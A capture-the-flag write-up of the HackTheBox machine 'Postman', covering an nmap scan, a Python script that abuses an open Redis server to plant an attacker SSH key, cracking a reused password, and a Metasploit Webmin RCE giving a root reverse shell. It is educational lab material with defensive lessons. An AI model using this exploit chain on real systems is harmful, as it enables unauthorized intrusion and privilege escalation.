Postman was an easy-going box. It required careful enumeration and beyond that did not have too much resistance in privilege escalation. This makes it a prime example for real-world M&M security where the initial foothold is hard, but there is few resistance on the inside. Let's start out by scanning the machine:

```sh
# nmap -sS -sC -oN postman.nmap -v 10.10.10.160
# Nmap 7.80 scan initiated Sun Dec  8 11:27:40 2019 as: nmap -sS -sC -oN postman.nmap -v -p1-10000 10.10.10.160
Increasing send delay for 10.10.10.160 from 0 to 5 due to 674 out of 2245 dropped probes since last increase.

There are a few interesting things here already. We have a webserver running on port 80, an unprotected Redis database server on the default port 6379, and a custom application on port 10000. The latter one apparently is using an SSL certificate where the `organizationName` already tells us that we are dealing with a Webmin admin panel here. That is already decent information to start out with! Looking at the website on port 80, there is no real attack surface present. It's just static content.

![Image]({static}/images/screenshot-from-2019-12-01-13-59-10.png){: .image-process-article-image}

Moving on to port 10000, we are presented with a redirect to an SSL site.

![Image]({static}/images/screenshot-from-2019-12-01-13-59-58.png){: .image-process-article-image}

To make this work, we tweak our `/etc/hosts` file a bit and move to the site mentioned above. There we are presented with a Webmin login panel.

A few tries with default username/password combinations did not yield any success, so let's move on. We don't want to bruteforce the credentials here out of politeness to the other people hacking on it. :) About Redis and port 6379, there is a general rule of thumb for production usage: **NEVER PUT THIS THING ON THE OPEN INTERNET.** If you don't believe me, read the same thing in the [Redis docs](https://redis.io/topics/security) - worded a bit more elegantly:

> Redis is designed to be accessed by trusted clients inside trusted environments. This means that usually it is not a good idea to expose the Redis instance directly to the internet or, in general, to an environment where untrusted clients can directly access the Redis TCP port or UNIX socket.

In my attack I made some assumptions, such as that the user the DB is running under is called `redis`, that its home directory is `/var/lib/redis/` and that the config options used in the attack are available. All of these should be true by default. So I generated a new SSH keypair and hacked up a little Python script:

```python
import redis


print("[+] Reading key")
with open("attacker.key", "r") as keyfile:
    key = "\n\n" + keyfile.read().strip() + "\n\n"

print("[+] Connecting to Redis")
r = redis.StrictRedis(
    host='10.10.10.160',
    port=6379,
)

print("[+] Flushing DB")
r.flushdb()

print("[+] Setting attacker SSH key")
r.set("itdonottouch", key)

print("[+] Setting configuration keys")
r.config_set("dir", "/var/lib/redis/.ssh/")
r.config_set("dbfilename", "authorized_keys")

print("[+] Saving changes to Redis disk")
r.save()

print("[+] Exploit finished - try ssh with redis@10.10.10.160")
```

Pulling this attack off requires basic knowledge of the Python `redis` [package](https://pypi.org/project/redis/), DB flushing, and an understanding of the two config keys I have used. The key names and their effect can be understood by checking out the relevant section in the Redis default config file:

```
# The filename where to dump the DB
dbfilename dump.rdb

# The working directory.
#
# The DB will be written inside this directory, with the filename specified
# above using the 'dbfilename' configuration directive.
#
# The Append Only File will also be created inside this directory.
#
# Note that you must specify a directory here, not a file name.
dir ./
```

After executing the exploit, we simply need to SSH into the box as `redis` user:

```sh
# ssh -i ~/.ssh/id_rsa redis@10.10.10.160

Looking around a bit, we find an interesting backup file:

```sh
redis@Postman:~$ ls
/opt/ id_rsa.bak

```

It's an encrypted SSH key, so we `base64` it, copy it over, and decode it.

```sh
redis@Postman:~$ cat /opt/id_rsa.bak | base64

Got it. The only thing left to know now is a username. A quick look at `/etc/passwd` helps us here:

```
root:x:0:0:root:/root:/bin/bash
...
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```

However, when we try to SSH into the box as Matt from our remote machine, or the box' `localhost`, we get a permission error. Password authentication in SSH is enabled, however. So a good guess would be that Matt was a lazy user and reused his password that he previously encrypted his SSH key with.

```sh
redis@Postman:~$ su Matt
Password:
Matt@Postman:/var/lib/redis$
```

Damnit, Matt. We talked about this password rotation policy things in so many meetings before! In his home directory we can find the user flag. Now on to root. Poking around the machine with Matt's access rights, we don't find much. It's a good time to think back: We found a Webmin panel and Matt is already guilty once of password reuse. Let's give it another shot.

Matt, come on! And on top of that, someone didn't install their security updates:

![Image]({static}/images/screenshot-from-2019-12-08-13-44-55.png){: .image-process-article-image}

Webmin itself has a set of very interesting functionalities to manage systems. So it doesn't come as a surprise if it's running under elevated privileges. Scouring the web for some interesting exploits, we find this [Webmin security bulletin](http://www.webmin.com/exploit.html) - and our current version seems to be 1.910. Normally I like to script my exploits in Python to get a deeper understanding of what they do, but this time I was inspired by Matt's laziness and decided to take the easy way in with Metasploit:

```
msf5 exploit(linux/http/webmin_packageup_rce) > options

Module options (exploit/linux/http/webmin_packageup_rce):

   Id  Name

   0   Webmin <= 1.910
```

Firing this we end up with a root shell:

```
msf5 exploit(linux/http/webmin_packageup_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.13:4444
[+] Session cookie: 93a0b7c6234b1354928550dc12865af2

id
uid=0(root) gid=0(root) groups=0(root)
```

... and the root flag is secured.

If there is anything to be learnt here, it is to never use Redis as an open service to the internet, and to always make sure your users do not reuse their passwords. Especially not if they're as crappy as `computer2008`. Often times users are not doing this because they're stupid, but rather because they lack vital security education. So let's not rant too much about Matt and hope his employer is going to send him to some nice workshops to get him up to speed. :)
